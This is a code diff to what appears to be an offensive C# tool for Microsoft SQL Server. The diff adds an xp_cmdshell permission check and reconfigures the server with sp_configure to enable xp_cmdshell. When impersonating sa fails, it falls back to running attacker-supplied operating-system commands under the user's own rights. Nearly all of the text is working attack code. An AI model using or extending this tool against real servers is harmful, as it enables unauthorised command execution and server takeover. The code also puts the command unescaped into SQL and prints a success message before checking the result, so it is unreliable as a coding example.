@@ -6,6 +6,26 @@ namespace SQL
 {
     class Program
     {
+        static bool check_xp_cmdshell(SqlConnection con)
+        {
+            try
+            {
+                // Check if the user has EXECUTE permissions on xp_cmdshell
+                SqlCommand checkPermissionsCommand = new SqlCommand("IF HAS_PERMS_BY_NAME('xp_cmdshell', 'OBJECT', 'EXECUTE') = 1 BEGIN SELECT 1 END ELSE BEGIN SELECT 0 END", con);
+                int result = (int)checkPermissionsCommand.ExecuteScalar();
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.WriteLine("Hooray! You can execute xp_cmdshell!");
+                Console.ResetColor();
+                return result == 1;
+            }
+            catch (SqlException ex)
+            {
+                Console.WriteLine("Error checking xp_cmdshell permissions: " + ex.Message);
+                return false;
+            }
+        }
+
+
         static void ole_cmd(SqlConnection con, string cmd)
         {
 
@@ -25,26 +45,33 @@ namespace SQL
 
         static void xp_cmdshell(SqlConnection con, string cmd)
         {
-            
-            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
-            String execCmd = $"EXEC xp_cmdshell '{cmd}'";
-
-
-            SqlCommand command = new SqlCommand(enable_xpcmd, con);
-            SqlDataReader reader = command.ExecuteReader();
-            reader.Close();
-
-            command = new SqlCommand(execCmd, con);
-            reader = command.ExecuteReader();
-            Console.WriteLine("Result of command is: ");
-            while (reader.Read())
+            try
             {
-                Console.WriteLine(reader[0]);
+                String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
+                SqlCommand command = new SqlCommand(enable_xpcmd, con);
+                SqlDataReader reader = command.ExecuteReader();
+                reader.Close();
             }
+            catch (Exception ex)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("Looks like you cant reconfigure server and enable xp_cmdshell...");
+                Console.ResetColor();
+                Console.WriteLine("But we will try anyway!");
+            }
+            finally
+            {
+                String execCmd = $"EXEC xp_cmdshell '{cmd}'";
+                SqlCommand command = new SqlCommand(execCmd, con);
+                SqlDataReader reader = command.ExecuteReader();
+                Console.WriteLine("Result of command is: ");
+                while (reader.Read())
+                {
+                    Console.WriteLine(reader[0]);
+                }
 
-            reader.Close();
-            
-
+                reader.Close();
+            }
         }
 
 
@@ -228,7 +255,7 @@ namespace SQL
                     }
                     if (impersonation(con))
                     {
-                        Console.WriteLine("Trying to execute command with xp_cmdshell ...");
+                        Console.WriteLine("Trying to execute command with xp_cmdshell as sa ...");
                         xp_cmdshell(con, args[3]);
                     }
                     else
@@ -236,6 +263,18 @@ namespace SQL
                         Console.ForegroundColor = ConsoleColor.Red;
                         Console.WriteLine("Unfortunately you cant impersonate sa.");
                         Console.ResetColor();
+                        Console.WriteLine("Trying again with user permissions ...");
+                        if (check_xp_cmdshell(con))
+                        {
+                            Console.WriteLine("Trying to execute command with xp_cmdshell ...");
+                            xp_cmdshell(con, args[3]);
+                        }
+                        else
+                        {
+                            Console.ForegroundColor = ConsoleColor.Red;
+                            Console.WriteLine("Unfortunately you cant execute xp_cmdshell.");
+                            Console.ResetColor();
+                        }
                     }
                     con.Close();
                     break;
